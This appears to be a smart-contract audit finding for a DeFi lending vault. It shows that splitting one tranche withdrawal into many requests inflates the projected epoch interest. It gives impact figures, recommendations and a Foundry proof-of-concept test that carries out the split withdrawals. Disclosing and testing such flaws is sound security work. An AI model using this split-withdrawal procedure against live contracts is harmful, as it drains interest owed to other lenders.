### Title
Splitting a tranche withdrawal inflates fixed epoch interest and drains other lenders’ yield - ([File: contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
`requestWithdraw` prices each request using the *current* tranche NAV while allocating that tranche a fixed share of interest calculated over the current total vault NAV. Submitting one withdrawal in many tranches therefore gives later requests a progressively larger share of the same epoch interest. For the subsidized tranche—normally BB—the aggregate projected interest can exceed that tranche’s fair share and even the entire epoch interest.

### Finding Description
During the buffer phase, an unprivileged KYC-passed tranche holder can call `requestWithdraw` repeatedly. Each call:

1. Converts the requested tranche amount to underlying at the current price.
2. Calculates epoch interest from the *current* vault NAV and current tranche NAV:
   `interest = amount * trancheInterest / lastSavedTrancheNAV`.
3. Mints a fixed withdrawal receipt for `principal + interest - fees`.
4. Burns only `principal`, reducing both vault NAV and tranche NAV before the next request.

For a BB withdrawal, `diff = interestWithoutSplitRatio - interest` is negative whenever the BB APR allocation exceeds its TVL share. Splitting the withdrawal increases the magnitude of the aggregate negative adjustment. At `startEpoch`, this can reduce the active lenders’ adjusted epoch interest to zero while the attacker’s inflated receipts remain fully payable through `pendingWithdraws`.

### Impact Explanation
The invariant “one principal position receives one pro-rata epoch-interest entitlement” is broken.

With equal AA and BB NAV, a 90% BB yield split, 10% APR, and a 30-day epoch, the fair BB interest is approximately `1,479` units per `200,000` principal. Splitting the BB withdrawal into around 100 equal requests produces approximately `2,070` units of interest before fees—more than the pool’s entire fair epoch interest of approximately `1,644`. The excess is extracted from the interest that should have accrued to active AA lenders; with further splitting, borrower funding requirements can exceed the fair total interest and cause a shortfall or default.

The attacker can use one account or multiple KYC-passed accounts and does not need any privileged role.

### Likelihood Explanation
Likelihood is moderate where:

- Withdrawal requests are enabled during the buffer period.
- The withdrawn tranche’s APR split exceeds its TVL share.
- Management and performance fees are low enough not to consume the inflation.
- The attacker controls a meaningful share of that tranche.

There is no minimum withdrawal amount or same-user/same-epoch batching guard. Each additional request is valid, updates `pendingWithdraws`, and receives its own inflated receipt.

### Recommendation
Calculate withdrawal interest against a fixed epoch-start or request-window snapshot that is not changed by prior withdrawal requests. Specifically:

- Snapshot `managedContractValue`, each tranche’s NAV, and the tranche’s total allocated epoch interest once per withdrawal window or epoch.
- Price all requests from that snapshot.
- Do not recompute `lastSavedNAV(_tranche)` after each principal burn.
- Alternatively, deduct both principal and its allocated interest entitlement from the snapshot used by subsequent requests.
- Add an invariant test asserting that for any partition `x = x₁ + … + xₙ`, total projected withdrawal interest equals the interest for `x`, within bounded rounding error.

### Proof of Concept
The following PoC is intended to be added to `test/foundry/IdleCreditVault.t.sol`, using that suite’s existing fixture and helpers.

```solidity
function testSplitWithdrawInflatesEpochInterest() external {
    uint256 amount = 100_000 * ONE_SCALE;

    // Keep fees at zero so the invariant is isolated.
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
    _setManagementFee(0);

    // Typical subsidized junior configuration: BB receives 90% of yield.
    vm.prank(owner);
    cdoEpoch.setTrancheAPRSplitRatio(10_000);

    idleCDO.depositAA(amount);
    idleCDO.depositBB(amount);
    _transferBurnedTrancheTokens(address(this), true);
    _transferBurnedTrancheTokens(address(this), false);

    // Ensure requests occur during a buffer period.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    uint256 bbBalance = IERC20Detailed(address(BBtranche)).balanceOf(address(this));
    uint256 bbPrincipal =
        bbBalance * cdoEpoch.tranchePrice(address(BBtranche)) / ONE_TRANCHE_TOKEN;

    uint256 baselineInterest =
        _calcInterestWithdrawRequest(bbPrincipal, address(BBtranche));

    uint256 chunks = 100;
    uint256 chunk = bbBalance / chunks;
    uint256 aggregateReceipts;
    uint256 aggregatePrincipal;

    for (uint256 i; i < chunks; ++i) {
        uint256 requestAmount = i == chunks - 1
            ? IERC20Detailed(address(BBtranche)).balanceOf(address(this))
            : chunk;

        uint256 navBefore =
            cdoEpoch.lastNAVBB();

        uint256 receipt =
            cdoEpoch.requestWithdraw(requestAmount, address(BBtranche));

        aggregatePrincipal += navBefore - cdoEpoch.lastNAVBB();
        aggregateReceipts += receipt;
    }

    uint256 aggregateInterest = aggregateReceipts - aggregatePrincipal;

    assertEq(aggregatePrincipal, bbPrincipal, "principal changed");
    assertGt(
        aggregateInterest,
        baselineInterest,
        "split withdrawal did not inflate interest"
    );

    // With the example parameters the aggregate projected interest exceeds the
    // pool's whole fair epoch interest, leaving no valid yield for active AA.
    uint256 fairPoolInterest = _calcInterest(amount * 2)
        * cdoEpoch.epochDuration()
        / (cdoEpoch.epochDuration() + cdoEpoch.bufferPeriod());

    assertGt(
        aggregateInterest,
        fairPoolInterest,
        "receipts do not exceed total epoch interest"
    );

    _startEpochAndCheckPrices(1);

    assertEq(
        cdoEpoch.expectedEpochInterest(),
        0,
        "split requests did not drain active-lender interest"
    );
}
```